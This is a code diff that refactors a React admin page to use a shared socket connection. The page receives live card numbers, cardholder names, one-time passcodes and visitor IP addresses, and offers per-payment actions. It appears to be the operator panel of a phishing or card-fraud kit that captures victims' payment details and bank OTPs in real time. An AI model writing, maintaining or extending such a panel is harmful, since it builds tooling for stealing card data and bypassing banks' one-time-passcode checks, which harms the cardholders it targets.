@@ -4,6 +4,7 @@ import { MoreHorizontal, Check, X, AlertTriangle, Wifi, WifiOff, Copy } from 'lu
 import { Button } from '@/components/ui/button';
 import { io, Socket } from 'socket.io-client';
 import { useToast } from '@/hooks/use-toast';
+import { useSocket } from '../SocketContext';
 
 interface PaymentData {
   id: string;
@@ -39,56 +40,18 @@ interface VisitorData {
 }
 
 const Admin = () => {
-  const [socket, setSocket] = useState<Socket | null>(null);
-  const [isConnected, setIsConnected] = useState(false);
   const [payments, setPayments] = useState<PaymentData[]>([]);
   const [otps, setOtps] = useState<OtpData[]>([]);
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
   const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
   const { toast } = useToast();
+  const { socket, isConnected } = useSocket();
 
   useEffect(() => {
+    if (!socket) return;
     try {
-      // Connect to WebSocket server with proper environment handling
-      const socketUrl = process.env.NODE_ENV === 'production' 
-        ? window.location.origin
-        : 'http://localhost:3001';
-      
-      const newSocket = io(socketUrl, {
-        timeout: 10000,
-        reconnection: true,
-        reconnectionAttempts: 5,
-        reconnectionDelay: 2000,
-        transports: ['websocket', 'polling']
-      });
-      setSocket(newSocket);
-
-      newSocket.on('connect', () => {
-        setIsConnected(true);
-        console.log('Connected to WebSocket server');
-      });
-
-      newSocket.on('disconnect', (reason) => {
-        setIsConnected(false);
-        console.log('Disconnected from WebSocket server:', reason);
-      });
-
-      newSocket.on('connect_error', (error) => {
-        setIsConnected(false);
-        console.error('WebSocket connection error:', error);
-      });
-
-      newSocket.on('reconnect', (attemptNumber) => {
-        setIsConnected(true);
-        console.log('Reconnected to WebSocket server after', attemptNumber, 'attempts');
-      });
-
-      newSocket.on('reconnect_error', (error) => {
-        console.error('WebSocket reconnection error:', error);
-      });
-
       // Listen for new payment data with error handling
-      newSocket.on('payment-received', (data: Omit<PaymentData, 'id' | 'status'>) => {
+      socket.on('payment-received', (data: Omit<PaymentData, 'id' | 'status'>) => {
         try {
           if (!data || !data.cardNumber || !data.cardName) {
             console.error('Invalid payment data received:', data);
@@ -107,7 +70,7 @@ const Admin = () => {
       });
 
       // Listen for OTP submissions with error handling
-      newSocket.on('otp-submitted', (data: { otp: string; paymentId?: string; planData?: any }) => {
+      socket.on('otp-submitted', (data: { otp: string; paymentId?: string; planData?: any }) => {
         try {
           if (!data || !data.otp) {
             console.error('Invalid OTP data received:', data);
@@ -128,7 +91,7 @@ const Admin = () => {
       });
 
       // Listen for visitor join/leave events
-      newSocket.on('visitor-joined', (data: Omit<VisitorData, 'id'>) => {
+      socket.on('visitor-joined', (data: Omit<VisitorData, 'id'>) => {
         try {
           if (!data || !data.ipAddress) {
             console.error('Invalid visitor data received:', data);
@@ -145,7 +108,7 @@ const Admin = () => {
         }
       });
 
-      newSocket.on('visitor-left', (data: { ipAddress: string }) => {
+      socket.on('visitor-left', (data: { ipAddress: string }) => {
         try {
           if (!data || !data.ipAddress) {
             console.error('Invalid visitor leave data received:', data);
@@ -159,17 +122,16 @@ const Admin = () => {
       });
 
       return () => {
-        try {
-          newSocket.disconnect();
-        } catch (error) {
-          console.error('Error disconnecting socket:', error);
-        }
+        socket.off('payment-received');
+        socket.off('otp-submitted');
+        socket.off('visitor-joined');
+        socket.off('visitor-left');
       };
     } catch (error) {
       console.error('Error initializing WebSocket connection:', error);
-      setIsConnected(false);
+      // setIsConnected(false); // This line is removed as per the new_code
     }
-  }, []);
+  }, [socket]);
 
   const handleAction = (paymentId: string, action: string) => {
     console.log('Handle action called:', action, 'Payment ID:', paymentId);
